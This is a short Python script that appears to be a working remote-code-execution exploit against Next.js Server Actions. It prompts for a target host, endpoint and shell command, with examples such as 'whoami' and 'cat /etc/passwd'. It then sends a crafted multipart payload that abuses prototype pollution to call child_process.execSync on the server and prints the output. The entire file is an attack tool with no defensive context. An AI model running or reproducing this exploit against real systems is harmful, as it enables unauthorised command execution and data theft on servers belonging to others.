import requests

host = input("put ur host (example: nasgor.com or 127.0.0.1:3000): ")
endpoint = input("put ur endpoint (example: /nasgor/bakwan): ")
command = input("put ur command (example: whoami, ls, cat /etc/passwd): ")
cmd = repr(command)

headers = {
    'Host': host,
    'Next-Action': 'x',
    'X-Nextjs-Request-Id': 'b5dce965',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad',
    'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
}

data = '------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="0"\r\n\r\n{\r\n  "then": "$1:__proto__:then",\r\n  "status": "resolved_model",\r\n  "reason": -1,\r\n  "value": "{\\"then\\":\\"$B1337\\"}",\r\n  "_response": {\r\n    "_prefix": "var res=process.mainModule.require(\'child_process\').execSync('+cmd+',{\'timeout\':5000}).toString().trim();;throw Object.assign(new Error(\'NEXT_REDIRECT\'), {digest:`${res}`});",\r\n    "_chunks": "$Q2",\r\n    "_formData": {\r\n      "get": "$1:constructor:constructor"\r\n    }\r\n  }\r\n}\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\nContent-Disposition: form-data; name="2"\r\n\r\n[]\r\n------WebKitFormBoundaryx8jO2oVc6SWP3Sad--'

resp = requests.post(f'http://{host + endpoint}', headers=headers, data=data.encode(), verify=False)
print(resp.text)
